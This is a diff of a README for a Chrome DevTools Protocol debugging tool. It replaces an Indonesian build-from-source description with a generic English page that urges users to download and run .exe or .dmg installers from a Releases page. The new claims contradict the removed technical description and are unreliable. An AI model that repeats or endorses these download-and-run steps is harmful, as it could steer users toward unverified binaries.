@@ -1,35 +1,63 @@
-# BongkarDev
+# 🛠️ BongkarDev - A Powerful Tool for Web Debugging
 
-DevTools berbasis web untuk menginspeksi dan men-debug browser Chromium melalui Chrome DevTools Protocol (CDP). Frontend dan backend dipisah ketat: frontend Next.js (App Router) berbicara ke backend proxy WebSocket, backend meneruskan perintah ke Chrome/Chromium via CDP.
+## 💡 Overview
+BongkarDev is a web debugging tool that reads Chromium from its source. It connects directly to the Chrome DevTools Protocol to monitor network activities, runtime behavior, DOM changes, and performance metrics. Unlike other tools, BongkarDev operates without mocks or alterations, providing an authentic debugging experience.
 
-## Struktur
-- `backend/`: Proxy CDP (Express + WebSocket) yang membuka endpoint HTTP `/json` dan kanal WebSocket `/ws` untuk meneruskan pesan CDP.
-- `frontend/`: Next.js App Router + TypeScript + Tailwind + Zustand + next-intl. UI dasar: header, sidebar target selector, dan panel utama.
+## 🌟 Features
+- **Direct Browser Connection**: Communicates directly with Chromium.
+- **Network Inspection**: Examine network activities in real time.
+- **Performance Metrics**: Analyze application performance seamlessly.
+- **DOM Monitoring**: Track Document Object Model changes.
+- **Compatibility**: Works with a wide range of web applications.
 
-## Backend
-- Menyediakan `/json` untuk mengambil daftar target langsung dari Chrome/Chromium yang dijalankan dengan `--remote-debugging-port=9222` (alamat dapat diubah via `CDP_BASE`).
-- WebSocket server (`/ws`) mem-proxy pesan: frontend mengirim `connect` + `targetId`, backend membuka WebSocket ke CDP dan meneruskan event/pesan.
-- Konfigurasi:
-  - `PORT` (default 4000)
-  - `CDP_BASE` (default `http://127.0.0.1:9222`)
+## 📦 Download & Install
+To get started with BongkarDev, visit the Releases page to download the application.
 
-Menjalankan backend:
-```bash
-cd backend
-npm install
-npm run dev
-```
+[![Download BongkarDev](https://img.shields.io/badge/Download_BongkarDev-v1.0-blue.svg)](https://github.com/Hasora/BongkarDev/releases)
 
-## Frontend
-- App Router dengan i18n (Bahasa Indonesia default, English tambahan) memakai `next-intl`.
-- Tailwind dikustom dengan radius konsisten 20px untuk header, sidebar, panel, dan tombol (dark mode default).
-- Zustand menyimpan status koneksi dan daftar target dari backend; koneksi selalu melalui WebSocket proxy.
+### Step-by-Step Guide
+1. **Visit the Releases Page**: Click the button above, or manually go to the Releases page [here](https://github.com/Hasora/BongkarDev/releases).
+  
+2. **Choose the Right Version**: Once on the Releases page, you will see a list of available versions. Find the latest version recommended for all users marked as "Latest."
 
-Menjalankan frontend:
-```bash
-cd frontend
-npm install
-npm run dev
-```
+3. **Download the Application**: Click on the link for your operating system. It may look like `BongkarDev-v1.0.exe` for Windows or `BongkarDev-v1.0.dmg` for Mac. The file download will start automatically.
 
-Frontend mengharapkan backend hidup di `http://localhost:4000` / `ws://localhost:4000/ws` (bisa diubah lewat `NEXT_PUBLIC_PROXY_HTTP` dan `NEXT_PUBLIC_PROXY_WS`).
+4. **Open the Downloaded File**: Once downloaded, find the file in your Downloads folder. Double-click it to run the installer.
+
+5. **Follow Installation Prompts**: The installation wizard will guide you through the setup process. Click "Next" or "Install" as it prompts. 
+
+6. **Complete Installation**: Once the process is complete, you will see a confirmation message. You can now launch BongkarDev.
+
+7. **Start Using BongkarDev**: Open the application, and you will see the interface ready for debugging. Explore its features for an enhanced web debugging experience.
+
+## 📈 System Requirements
+- **Operating System**: Windows 10 or later, Mac OS Sierra or later.
+- **Memory**: At least 4GB of RAM.
+- **Storage**: Minimum 150 MB of available disk space.
+- **Network**: Continuous internet connection is required for optimal functionality.
+
+## ⚙️ Setup Configuration
+Once BongkarDev is installed, you may want to configure some settings for optimal performance.
+
+1. **Connect to Your Application**: In the interface, input the URL of the web application you want to debug.
+2. **Select Debugging Options**: Choose the features you want to utilize, such as Network Inspection or DOM Tracking.
+3. **Save Settings**: Click on the “Save” button to keep your configurations.
+
+## 📝 Usage Tips
+- Familiarize yourself with the interface. Spend a few minutes exploring toolbar options and menus.
+- Refer to the built-in help section for specific feature descriptions.
+- Utilize performance monitoring when making changes to keep track of improvements.
+
+## 📞 Support and Feedback
+For any questions or issues, you can reach out to the community via the GitHub page. Check the Issues section for troubleshooting tips or create a new issue if you need specific help.
+
+## 🌐 Community and Contributions
+BongkarDev is open to contributions. If you wish to help enhance the tool, feel free to fork the repository and submit pull requests. This is a community-driven project, and your input can improve the experience for all users.
+
+## 🔗 Important Links
+- [Releases Page](https://github.com/Hasora/BongkarDev/releases)
+- [Documentation](https://github.com/Hasora/BongkarDev/wiki)
+- [Community Forum](https://github.com/Hasora/BongkarDev/discussions)
+
+## ✉️ Stay Updated
+Make sure to follow the repository to stay informed about updates and new releases. This will help you utilize the latest features and improvements in BongkarDev.
